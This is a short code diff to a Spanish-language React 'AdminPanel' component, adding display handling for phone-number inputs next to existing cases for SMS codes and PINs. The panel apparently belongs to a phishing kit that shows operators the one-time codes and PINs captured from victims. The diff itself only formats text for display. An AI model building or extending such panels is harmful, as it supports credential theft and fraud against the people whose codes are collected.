@@ -383,6 +383,10 @@ export default function AdminPanel() {
               case 'codigo':
                 inputDescription = `Código SMS: ${inputData.codigo}`;
                 break;
+              case 'telefono':
+              case 'celular':
+                inputDescription = `Teléfono: ${inputData.telefono || inputData.celular}`;
+                break;
               case 'nip':
                 inputDescription = `NIP: ${inputData.nip}`;
                 break;
